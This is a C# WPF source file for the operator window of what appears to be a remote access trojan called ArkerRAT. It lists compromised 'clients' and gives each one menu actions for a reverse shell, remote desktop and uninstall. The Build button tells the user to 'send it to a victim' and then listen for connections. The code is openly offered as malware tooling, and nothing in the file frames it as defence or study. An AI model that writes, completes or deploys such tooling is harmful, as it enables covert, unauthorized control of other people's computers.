using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using System.Net;
using System.Net.Sockets;

namespace ArkerRAT1
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            Thread updateThread = new Thread(new ThreadStart(UpdateUI));
            updateThread.SetApartmentState(ApartmentState.STA);
            updateThread.Start();
            this.WindowState = WindowState.Normal;
            this.Activate();

            //Assing the standard IP
            Task.Run(() =>
            {
                    try
                    {
                        string address = "";
                        WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                        using (WebResponse response = request.GetResponse())
                        using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                        {
                            address = stream.ReadToEnd();
                        }

                        int first = address.IndexOf("Address: ") + 9;
                        int last = address.LastIndexOf("</body>");
                        address = address.Substring(first, last - first);
                        Application.Current.Dispatcher.BeginInvoke((Action)(() =>
                        {
                            iPInput.Text = address;
                        }));
                    }
                    catch (Exception ex){}
            });
            
        }

        int oldCount = 0;
        private void UpdateUI()
        {
            while(true)            
            {
                if (ArkerRATServerMechanics.rATClients.Count() != oldCount)
                {
                    oldCount = ArkerRATServerMechanics.rATClients.Count();
                    Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                    {
                        clientAmountLabel.Content = ArkerRATServerMechanics.rATClients.Count();
                        serverAmountLabel.Content = 0;
                    }));
                }

                this.Dispatcher.BeginInvoke(new Action(() =>
                {
                    //ArkerRATServerMechanics.port = Convert.ToInt32(portInput.Text);
                    LoadCLients();
                }));
                Thread.Sleep(1000);
            };
        }

        private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {

        }
        //________________________________________________________________________________________________________

        //Custome buttons top right
        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void ipInput_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            ArkerRATServerMechanics.StopListener();

            Environment.Exit(0);
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {

        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        //________________________________________________________________________________________________________

        //Clients name sorter
        private void Button_Click_3(object sender, RoutedEventArgs e)
        {

        }

        //OS sorter
        private void Button_Click_4(object sender, RoutedEventArgs e)
        {

        }

        //Ip-dress sorter
        private void Button_Click_5(object sender, RoutedEventArgs e)
        {

        }

        //Ping/ms sorter
        private void Button_Click_6(object sender, RoutedEventArgs e)
        {

        }

        //Refresh
        private void Button_Click_7(object sender, RoutedEventArgs e)
        {
            LoadCLients();
        }

        //Search
        private void Button_Click_8(object sender, RoutedEventArgs e)
        {

        }

        private void ScrollBar_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {

        }
        //________________________________________________________________________________________________________
        //Settings
        private void crypterOn_Checked(object sender, RoutedEventArgs e)
        {
            this.Opacity = 0.95;
        }

        private void crypterOff_Checked(object sender, RoutedEventArgs e)
        {
            this.Opacity = 1;
        }
        //_________________________________________________________________________________________________________

        //Program

        private delegate void LoadClientsFromOtherThread(ListBox listbox);

        private void Build(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("ArkerRAT has been compiled SUCCESSFULLY send it to a victim, and start listening for conections at the network tab. " +
               "All the available clients will be shown at the clients tab.");
        }

        private async void Listener(object sender, RoutedEventArgs e)
        {   
            if (!ArkerRATServerMechanics.ports.Contains(Convert.ToInt32(portInput.Text)))
            {
                Button serverButton = new Button();
                serverButton.Width = 700;
                serverButton.Height = 50;
                System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
                System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
                serverButton.BorderBrush = new SolidColorBrush(arkerPurple);
                serverButton.Foreground = new SolidColorBrush(arkerPurple);
                serverButton.Background = new SolidColorBrush(arkerGrey);
                serverButton.Content = portInput.Text;
                serverButton.Click += new RoutedEventHandler(RemoveServer);
                serverButton.Tag = Convert.ToInt32(portInput.Text);
                loadServers.Items.Add(serverButton);
                ArkerRATServerMechanics.ports.Add(Convert.ToInt32(portInput.Text));
                ArkerRATServerMechanics.StartServer();
            }
        }

        private async void RemoveServer(object sender, RoutedEventArgs e)
        {
            Button button = (Button)sender;
            ArkerRATServerMechanics.ports.Remove((int)button.Tag);
            ArkerRATServerMechanics.StopListener();
            ArkerRATServerMechanics.StartServer();
            loadServers.Items.Remove(button);
        }

        public void CyperTools(Button clientButton)
        {
            MenuItem reversShellButton = new MenuItem();
            reversShellButton.Header = "Reverse-shell";
            reversShellButton.Icon = new System.Windows.Controls.Image
            {
                Stretch = Stretch.Fill,
                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\cmd.png"))
            };

            MenuItem unInstall = new MenuItem();
            unInstall.Header = "Uninstall client";
            unInstall.Icon = new System.Windows.Controls.Image
            {
                Stretch = Stretch.Fill,
                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\remove.png"))
            };

            MenuItem disconnect = new MenuItem();
            disconnect.Header = "Disconnect client";
            disconnect.Icon = new System.Windows.Controls.Image
            {
                Stretch = Stretch.Fill,
                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\remove.png"))
            };

            MenuItem remoteDesktop = new MenuItem();
            remoteDesktop.Header = "Remote desktop";
            remoteDesktop.Icon = new System.Windows.Controls.Image
            {
                Stretch = Stretch.Fill,
                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\desktop.png"))
            };

            clientButton.ContextMenu = new ContextMenu();
            clientButton.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
            clientButton.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));

            //Tools
            clientButton.ContextMenu.Items.Add(reversShellButton);
            clientButton.ContextMenu.Items.Add(remoteDesktop);

            //Dieconnect
            clientButton.ContextMenu.Items.Add(unInstall);
            clientButton.ContextMenu.Items.Add(disconnect);

            clientButton.ContextMenu.Visibility = Visibility.Visible;

            for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
            {
                if (ArkerRATServerMechanics.rATClients[y].clientButton.Tag as string == clientButton.Tag as string)
                {
                    reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartReverseShell);
                    unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Uninstall);
                    disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Disconnect);
                    remoteDesktop.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteDesktop);
                }
            }
        }

        public void LoadCLients()
        {

            loadClients.Items.Clear();
            for (int y = 0; y < ArkerRATServerMechanics.rATClients.Count; y++)
            {
                ArkerRATServerMechanics.rATClients[y].clientButton.Width = 700;
                ArkerRATServerMechanics.rATClients[y].clientButton.Height = 50;
                System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
                System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
                ArkerRATServerMechanics.rATClients[y].clientButton.BorderBrush = new SolidColorBrush(arkerPurple);
                ArkerRATServerMechanics.rATClients[y].clientButton.Foreground = new SolidColorBrush(arkerPurple);
                ArkerRATServerMechanics.rATClients[y].clientButton.Background = new SolidColorBrush(arkerGrey);
                ArkerRATServerMechanics.rATClients[y].clientButton.Content = ArkerRATServerMechanics.rATClients[y].clientInfo + "\t" + ArkerRATServerMechanics.rATClients[y].ms + "ms";
                loadClients.Items.Add(ArkerRATServerMechanics.rATClients[y].clientButton);
                CyperTools(ArkerRATServerMechanics.rATClients[y].clientButton);
            }
        }
    }
}